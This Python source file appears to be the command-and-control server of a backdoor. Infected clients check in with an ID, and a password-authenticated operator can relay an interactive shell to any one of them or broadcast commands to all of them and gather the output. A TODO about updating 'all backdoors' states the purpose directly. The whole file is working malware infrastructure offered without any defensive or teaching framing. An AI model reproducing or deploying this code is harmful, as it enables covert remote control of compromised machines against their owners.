#!/usr/bin/env python3

import argparse
import select
import socket
import sys
from server_config import *
from datetime import timedelta

ADMINS = set()
INPUTS = list()
OUTPUTS = list()
CLIENTS = dict()
BUSY = dict()
ALL_RECEIVER = [0, 0, []]


def authorized(resource: socket) -> bool:
    if resource not in ADMINS:
        _print("You are not authorized. Login first 'LOGIN pass'", WARN, resource)
        return False
    return True


def _print(message: str, mtype: int, socket=None) -> None :
    if DEBUG:    
        if socket:
            _send(socket, f"%s%s%s {message}" % (COLOR[mtype], PREFIX[mtype], attr(0)))
        else:
            print(f"%s%s%s {message}" % (COLOR[mtype], PREFIX[mtype], attr(0)))
    return None


def getCurClients() -> list:
    # TODO: remove from this list busy clients
    return list(CLIENTS.keys())


def _send(resource: socket, message: str, resource_id: str="") -> bool:

    if not resource:
        return False

    if type(message) is str:
        message = message.encode()

    try:
        resource.send(message + b"\n")
        return True
    except socket.error:
        clearResource(resource, resource_id)

    return False


def getRID(resource: socket) -> str:
    for rid, res in CLIENTS.items():
        if res == resource:
            return rid
    return None


def serverSocketInit() -> socket:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setblocking(0)
    server.bind(SERVER_ADDRESS)
    server.listen(MAX_CONNECTIONS)
    return server


def handleReadables(readables: list, server: socket) -> None:
    global ALL_RECEIVER

    for resource in readables:
        if resource is server:
            connection, client_address = resource.accept()
            connection.setblocking(0)
            INPUTS.append(connection)
            _print(f"New connection from {client_address}", INFO)
        else:
            data = ""

            try:
                data = resource.recv(1024).decode().strip()
            except:
                pass

            if data:
                _print("Getting data: {data}".format(data=str(data)), INFO)
                
                if PING_OP.match(data):
                    client_id = data.split()[1]
                    CLIENTS.update({client_id:resource})
                    _print(f"New ping from {client_id}", INFO)

                elif LOGIN_OP.match(data):
                    if AUTHKEY == data.split()[1]:
                        ADMINS.add(resource)
                        _print("Login success. You are welcome!", DONE, resource)
                    else:
                        _print("Wrong auth key. Try harder", WARN, resource)

                elif EXEC_OP.match(data) and authorized(resource):
                    _print(f"Try to create session with {data.split()[1]}", INFO)
                    handleExec(data.split()[1], resource)

                elif ALLE_OP.match(data) and authorized(resource):
                    _, need_output, command = data.split(maxsplit=2)
                    handleAll(command, int(need_output), resource)

                elif LS_OP.match(data) and authorized(resource):
                    _print(f"Available clients : {getCurClients()}", DONE, resource)

                elif STOP_OP.match(data) and authorized(resource):
                    if resource in BUSY.keys():
                        clearResource(BUSY[resource])
                        _print("Session closed", DONE, resource) 
                    else:
                        _print("No current sessions. Try 'EXEC client_id' first", WARN, resource)

                elif resource in ALL_RECEIVER[2] and ALL_RECEIVER[1]:
                    message = f"{COLOR[DONE]}{getRID(resource)}{COLOR[3]}\n  "
                    message += data.replace('\n', '\n  ')
                    _send(ALL_RECEIVER[0], message)
                    ALL_RECEIVER[2].remove(resource)
                    if len(ALL_RECEIVER[2]) == 0:
                        ALL_RECEIVER = [0, 0, []]
                 
                elif UPDATE_OP.match(data) and authorized(resource):
                   # TODO: update all backdoors
                   pass

                elif resource in BUSY.keys():
                    receiver = BUSY[resource]
                    if not _send(receiver, data):
                        clearResource(resource)

                if resource not in OUTPUTS:
                    OUTPUTS.append(resource)
            else:
                clearResource(resource)
    return None


def clearResource(resource: socket, resource_id: str="") -> None:

    if not resource and resource_id and resource_id in CLIENTS.keys():
        resource = CLIENTS[resource_id]
        
    if resource and not resource_id:
        for rid, r in CLIENTS.items():
            if resource == r:
                resource_id = rid
                break
                
    if resource in OUTPUTS:
        OUTPUTS.remove(resource)
    if resource in INPUTS:
        INPUTS.remove(resource)
    if resource in BUSY.keys():
        BUSY.pop(BUSY.pop(resource))
    if resource_id and resource_id in CLIENTS.keys():
        CLIENTS.pop(resource_id)
    if resource in ADMINS:
        ADMINS.remove(resource)
    if resource:
        _print('Closing connection ' + str(resource), INFO)
        resource.close()
    return None


def handleAll(command: str, need_output: int, initiator: socket) -> None:
    clients = CLIENTS.copy()
    ALL_RECEIVER[0] = initiator
    ALL_RECEIVER[1] = need_output
    for resource_id, resource in clients.items():
        if resource:
            _send(resource, "ALLE 1 " + command, resource_id)
            if need_output:
                ALL_RECEIVER[2].append(resource)
        else:
            _print(f"There is no such client:{resource_id}", WARN)
    return None


def handleExec(resource_id: str, initiator: socket) -> None:

    try:
        resource = CLIENTS[resource_id]
        if resource in BUSY.keys() or resource in BUSY.values():
            _print(f"Client is busy: {resource_id}", WARN, initiator)
            return None
        if _send(resource, "EXEC", resource_id):
            BUSY.update({resource: initiator})
            BUSY.update({initiator: resource})
    except:
        _print(f"No such client: {resource_id}", WARN)
        _print(f"No such client: {resource_id}", WARN, initiator)
        clearResource(None, resource_id)

    return None


if __name__ == '__main__':
    server_socket = serverSocketInit()
    INPUTS.append(server_socket)
    _print(f"Server started! {SERVER_ADDRESS}", DONE)
    try:
        while INPUTS:
            readables, writables, exceptional = select.select(INPUTS, OUTPUTS, INPUTS)
            handleReadables(readables, server_socket)
    except KeyboardInterrupt:
        clearResource(server_socket)
        _print("Server stopped!", DONE)
